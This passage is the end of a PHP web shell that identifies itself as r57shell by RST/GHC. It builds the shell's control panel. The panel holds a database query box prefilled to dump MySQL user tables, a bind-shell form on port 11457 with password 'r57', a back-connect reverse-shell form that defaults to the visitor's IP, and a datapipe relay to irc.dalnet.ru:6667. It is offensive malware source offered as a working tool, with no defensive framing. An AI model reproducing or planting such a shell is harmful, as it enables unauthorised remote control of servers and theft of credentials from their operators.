echo sr(35,"<b>".$lang[$language.'_text84'].$arrow."</b>".in('hidden','dir',0,$dir).in('hidden','cmd',0,'db_query'),"");
echo $te."<div align=center id='n'><textarea cols=55 rows=1 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES; SELECT * FROM user; SELECT version(); select user();"))."</textarea><br>".in('submit','submit',0,$lang[$language.'_butt1'])."</div></td>".$fe."</tr></div></table>";
}
if(!$safe_mode&&!$windows){
echo $table_up1.$lang[$language.'_text81'].up_down('id21').$table_up2.div('id21').$ts."<tr>".$fs."<td valign=top width=34%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text9']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text10'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text11'].$arrow."</b>",in('text','bind_pass',15,'r57'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt3']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text12']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text13'].$arrow."</b>",in('text','ip',15,((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1"))));
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt4']));
echo $te."</td>".$fe.$fs."<td valign=top width=33%>".$ts;
echo "<font face=Verdana size=-2><b><div align=center id='n'>".$lang[$language.'_text22']."</div></b></font>";
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'11457'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'irc.dalnet.ru'));
echo sr(40,"<b>".$lang[$language.'_text25'].$arrow."</b>",in('text','remote_port',15,'6667'));
echo sr(40,"<b>".$lang[$language.'_text26'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">datapipe.pl</option><option value=\"C\">datapipe.c</option></select>".in('hidden','dir',0,$dir));
echo sr(40,"",in('submit','submit',0,$lang[$language.'_butt5']));
echo $te."</td>".$fe."</tr></div></table>";
}
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RST/GHC | <a href=http://rst.void.ru>http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | version ".$version." ]---o</b></font></div></td></tr></table>".$f;
?>
